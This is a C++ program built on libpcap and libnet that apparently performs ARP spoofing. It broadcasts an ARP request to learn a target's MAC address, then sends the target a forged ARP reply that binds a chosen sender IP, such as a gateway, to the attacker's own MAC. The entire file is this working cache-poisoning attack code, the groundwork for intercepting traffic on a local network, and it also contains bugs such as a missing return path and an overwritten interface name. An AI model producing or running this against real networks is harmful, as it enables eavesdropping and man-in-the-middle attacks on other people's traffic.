#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <cstdint>
#include <string.h>
#include <pcap.h>
#include <stab.h>
#include <libnet/libnet-macros.h>
#include <libnet/libnet-structures.h>
#include <libnet/libnet-types.h>
#include <libnet/libnet-headers.h>

#include <iostream>
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <net/if.h>
#include <unistd.h>
#include <sstream>
#include <vector>
#include <sys/types.h>
#include <ifaddrs.h>
#include <typeinfo>

#define PCAP_OPENFLAG_PROMISCUOUS   1
using namespace std;


#pragma pack(1)
struct arp_format {
    uint8_t send_mac[6];
    in_addr_t send_ip;
    uint8_t target_mac[6];
    in_addr_t target_ip;
};
#pragma pack(8)

char* getIpAddress(char *interface)
{
    struct ifaddrs *ifap, *ifa;
    struct sockaddr_in *sa;

    getifaddrs (&ifap);
    for (ifa = ifap; ifa; ifa = ifa->ifa_next) {

        if (strcmp(ifa->ifa_name, interface) == 0)
        {
           if (ifa->ifa_addr->sa_family==AF_INET) {
                sa = (struct sockaddr_in *) ifa->ifa_addr;
                inet_ntoa(sa->sin_addr);
                //printf("Interface: %s\tAddress: %s\n", ifa->ifa_name, addr);
                freeifaddrs(ifap);
                return inet_ntoa(sa->sin_addr);
           }
        }
    }

    freeifaddrs(ifap);


}

void getMacAddress(char *interface, u_char *uc_Mac)
{
        int fd;

       struct ifreq ifr;
       //char *iface = "enp0s3";
       u_char *mac;

       fd = socket(AF_INET, SOCK_DGRAM, 0);

       ifr.ifr_addr.sa_family = AF_INET;
       strncpy((char *)ifr.ifr_name , (const char *)interface , IFNAMSIZ-1);

       ioctl(fd, SIOCGIFHWADDR, &ifr);

       close(fd);

       mac = (u_char*)ifr.ifr_hwaddr.sa_data;

       sprintf((char *)uc_Mac,(const char *)"%.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" , mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);


}
/**
 * @brief printHex
 * @detail Print Packet Data with Hex Format
 * @param length
 * @param packet
 */
void printHex(int length, const u_char* packet ) {

    int i=0;
    while(i<length) {
        printf("%02X ", packet[i]);

        ++i;
        if (i%8==0)
        {
            printf(" ");
        }
        if (i%16 == 0)
        {
            printf("\n");
        }
    }

    printf("\n");
}
/**
 * @brief printValue
 * @detail print Mac Address
 * @param uint8_t[] data
 */
void printValue(const uint8_t data[]) {
    int size = sizeof(data);
    for(int i=0;i<size;i++) {
        printf("%02X", data[i]);
        if (i != size-1)
        {
            printf(":");
        }
    }

    printf(" ");
}


vector<string> stringSplit(u_char *str, char deli)
{
    stringstream ss;
    ss << str;
    vector<string> result;

    while( ss.good() )
    {
        string substr;
        getline( ss, substr, deli );
        result.push_back( substr );
    }

    return result;
}

void setArpInfo(struct arp_format *ptr,  char *target_mac[6], char *target_ip,  vector<string> sender_mac, char *sender_ip)
{

}


/**
 * @brief main
 * @param argc
 * @param argv
 * @return
 */

//void setArpType(struct libnet_arp_hdr *ptr, uint8_t target_mac[6], char *target_ip, uint8_t sender_mac[6], char *sender_ip, u_int16_t opcode)
void setArpType(struct libnet_arp_hdr *ptr, u_int16_t opcode)
{
    //Set ARP Header
    ptr->ar_hrd = 0x0100;
    ptr->ar_hln = 0x06;
    ptr->ar_pro = 0x0008;
    ptr->ar_pln = 0x04;

    ptr->ar_op = opcode;
}

/**
 * @brief main
 * @param argc
 * @param argv
 * @return
 */
void setEther(struct libnet_ethernet_hdr *ptr, uint8_t target_mac[6], vector<string> sender_mac)
{

    //Set Target MAC
    ptr->ether_dhost[0] = target_mac[0];
    ptr->ether_dhost[1] = target_mac[1];
    ptr->ether_dhost[2] = target_mac[2];
    ptr->ether_dhost[3] = target_mac[3];
    ptr->ether_dhost[4] = target_mac[4];
    ptr->ether_dhost[5] = target_mac[5];

    //Set Sender MAC
    ptr->ether_shost[0] = stoi(sender_mac[0].c_str(),0,16);
    ptr->ether_shost[1] = stoi(sender_mac[1].c_str(),0,16);
    ptr->ether_shost[2] = stoi(sender_mac[2].c_str(),0,16);
    ptr->ether_shost[3] = stoi(sender_mac[3].c_str(),0,16);
    ptr->ether_shost[4] = stoi(sender_mac[4].c_str(),0,16);
    ptr->ether_shost[5] = stoi(sender_mac[5].c_str(),0,16);
    ptr->ether_type = 0x0608;


}
int main(int argc, char **argv) {
    pcap_t *fp;
    u_char packet[42];
    libnet_ethernet_hdr eth_header = {};
    libnet_ipv4_hdr* ip_header;
    libnet_arp_hdr arp_header = {};
    arp_format arp_info = {};

    char *interface = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    char *target_ip = argv[2];
    char *sender_ip = argv[3];

    char *my_ip = getIpAddress(interface);
    unsigned char mac[32]={0};

    //cout<<interface<<endl;
    getMacAddress(interface,mac);
    vector<string> split_mac = stringSplit(mac, ':');



    interface = pcap_lookupdev(errbuf);

    if ( (fp = pcap_open_live(interface, BUFSIZ, PCAP_OPENFLAG_PROMISCUOUS, 1000, errbuf)) == NULL)
    {
        fprintf(stderr,"Unable to open the Adapter.%s is not supported by Libpcap %s", interface, errbuf);
        return 0;
    }

    uint8_t tmp_target_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

    setEther(&eth_header, tmp_target_mac, split_mac);
    setArpType(&arp_header, 0x0100);



    //char tmp_mac[]={};
    //copy(split_mac.begin(), split_mac.end(), tmp_mac);
    //setArpInfo(&arp_info, &split_mac[0], my_ip, split_mac, target_ip);


    //Set send MAC
    //uint8_t tmp_target_mac2[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    //vector<string> target_mac2(tmp_target_mac2, tmp_target_mac2+sizeof tmp_target_mac2 / sizeof tmp_target_mac2[0]);
    //std::vector<string> target_mac2(std::begin(tmp_target_mac2), std::end(tmp_target_mac2));
    //std::vector<string> vect( std::begin(tmp_target_mac2), std::end(tmp_target_mac2) ) ;
    //vector<char*> myVector ( &var_name[0], &var_name[100] );


    //setArpInfo(&arp_info,vect, my_ip, split_mac, target_ip);

    arp_header.ar_hrd = 0x0100;
    arp_header.ar_hln = 0x06;
    arp_header.ar_pro = 0x0008;
    arp_header.ar_pln = 0x04;

    arp_header.ar_op = 0x0100;


    arp_info.send_ip = inet_addr(my_ip);

    //Set Sender MAC
    arp_info.send_mac[0] = stoi(split_mac[0].c_str(),0,16);
    arp_info.send_mac[1] = stoi(split_mac[1].c_str(),0,16);
    arp_info.send_mac[2] = stoi(split_mac[2].c_str(),0,16);
    arp_info.send_mac[3] = stoi(split_mac[3].c_str(),0,16);
    arp_info.send_mac[4] = stoi(split_mac[4].c_str(),0,16);
    arp_info.send_mac[5] = stoi(split_mac[5].c_str(),0,16);


    //Set Target MAC
    arp_info.target_ip = inet_addr(target_ip);
    arp_info.target_mac[0] = 0x00;
    arp_info.target_mac[1] = 0x00;
    arp_info.target_mac[2] = 0x00;
    arp_info.target_mac[3] = 0x00;
    arp_info.target_mac[4] = 0x00;
    arp_info.target_mac[5] = 0x00;



    //Copy Header to memory
    memcpy(packet, &eth_header, sizeof(eth_header));
    memcpy(packet+sizeof(eth_header), &arp_header, sizeof(arp_header));
    memcpy(packet+sizeof(eth_header)+sizeof(arp_header), &arp_info, sizeof(arp_info));

    //Send Packet

    printHex(sizeof(packet),packet);
    if (pcap_sendpacket(fp, packet, sizeof(packet)) != 0)
    {
        fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(fp));
        return 0;
    }
     while (true) {
        struct pcap_pkthdr* header;
        const libnet_ethernet_hdr* ethdr;
        const u_char* read_packet;
        const libnet_arp_hdr * recv_arp_info;
        const arp_format * recv_arp_data;

        int res = pcap_next_ex(fp, &header, &read_packet);

        //Get Ethernet Header From Packet
        ethdr = (struct libnet_ethernet_hdr*)(read_packet);
        uint16_t type = ethdr->ether_type;

        //arp check
        if (type == 0x0608)
        {
            cout<<"arp"<<endl;
            //Get IP Header From Packet
            recv_arp_info = (struct libnet_arp_hdr*)(read_packet+sizeof(struct libnet_ethernet_hdr));
            recv_arp_data = (struct arp_format*)(read_packet+sizeof(struct libnet_ethernet_hdr)+sizeof(struct libnet_arp_hdr));

            printf("%02X:%02X\n", recv_arp_data->send_mac[0], recv_arp_data->send_mac[1]);
            //printHex(sizeof(struct arp_format), reinterpret_cast<const u_char*>(recv_arp_data));
            //cout<<sizeof(recv_arp_data)<<endl;
            //cout<<std::hex<<recv_arp_data->target_mac<<endl;
            //printHex(header->caplen, read_packet);
            //printHex(sizeof(struct arp_format), read_packet+sizeof(struct libnet_ethernet_hdr)+sizeof(struct libnet_arp_hdr));
            //cout<<inet_ntop(recv_arp_data->send_ip)<<endl;
            //printf("%02X:%02X:%02X", recv_arp_data->send_mac[0], recv_arp_data->send_mac[1], recv_arp_data->send_mac[2]);
            //cout<<recv_arp_data<<endl;
            //printHex(sizeof(recv_arp_data), recv_arp_data);
            //cout<<std::hex<<recv_arp_info<<endl;

            //Set Target MAC
            eth_header.ether_dhost[0] = recv_arp_data->send_mac[0];
            eth_header.ether_dhost[1] = recv_arp_data->send_mac[1];
            eth_header.ether_dhost[2] = recv_arp_data->send_mac[2];
            eth_header.ether_dhost[3] = recv_arp_data->send_mac[3];
            eth_header.ether_dhost[4] = recv_arp_data->send_mac[4];
            eth_header.ether_dhost[5] = recv_arp_data->send_mac[5];

            /*
            eth_header.ether_dhost[1] = 0xff;
            eth_header.ether_dhost[2] = 0xff;
            eth_header.ether_dhost[3] = 0xff;
            eth_header.ether_dhost[4] = 0xff;
            eth_header.ether_dhost[5] = 0xff;
            */

            //uint8_t tmp_target_mac[6] = {recv_arp_data->, 0xff, 0xff, 0xff, 0xff, 0xff};
            //setEther(&eth_header, tmp_target_mac, split_mac);

            //Set Sender MAC
            eth_header.ether_shost[0] = stoi(split_mac[0].c_str(),0,16);
            eth_header.ether_shost[1] = stoi(split_mac[1].c_str(),0,16);
            eth_header.ether_shost[2] = stoi(split_mac[2].c_str(),0,16);
            eth_header.ether_shost[3] = stoi(split_mac[3].c_str(),0,16);
            eth_header.ether_shost[4] = stoi(split_mac[4].c_str(),0,16);
            eth_header.ether_shost[5] = stoi(split_mac[5].c_str(),0,16);
            eth_header.ether_type = 0x0608;

            //Set ARP Header
            arp_header.ar_hrd = 0x0100;
            arp_header.ar_hln = 0x06;
            arp_header.ar_pro = 0x0008;
            arp_header.ar_pln = 0x04;

            //Set Opcode
            arp_header.ar_op = 0x0200;

            //Set Sender IP & MAC
            //arp_info.send_ip = inet_addr("192.168.56.1");
            arp_info.send_ip = inet_addr(sender_ip);

            //Set Sender MAC
            arp_info.send_mac[0] = stoi(split_mac[0].c_str(),0,16);
            arp_info.send_mac[1] = stoi(split_mac[1].c_str(),0,16);
            arp_info.send_mac[2] = stoi(split_mac[2].c_str(),0,16);
            arp_info.send_mac[3] = stoi(split_mac[3].c_str(),0,16);
            arp_info.send_mac[4] = stoi(split_mac[4].c_str(),0,16);
            arp_info.send_mac[5] = stoi(split_mac[5].c_str(),0,16);


            //Set Target MAC
            arp_info.target_ip = inet_addr(target_ip);
            arp_info.target_mac[0] =recv_arp_data->send_mac[0];
            arp_info.target_mac[1] =recv_arp_data->send_mac[1];
            arp_info.target_mac[2] =recv_arp_data->send_mac[2];
            arp_info.target_mac[3] =recv_arp_data->send_mac[3];
            arp_info.target_mac[4] =recv_arp_data->send_mac[4];
            arp_info.target_mac[5] =recv_arp_data->send_mac[5];


            //Copy Header to memory
            memcpy(packet, &eth_header, sizeof(eth_header));
            memcpy(packet+sizeof(eth_header), &arp_header, sizeof(arp_header));
            memcpy(packet+sizeof(eth_header)+sizeof(arp_header), &arp_info, sizeof(arp_info));

            //Send Packet

            printHex(sizeof(packet),packet);
            if (pcap_sendpacket(fp, packet, sizeof(packet)) != 0)
            {
                fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(fp));
                return 0;
            }
            break;
        }
     }


    //cout<<endl<<"Mac Address : "<<mac;
    pcap_close(fp);
    return 0;



    return 0;
}
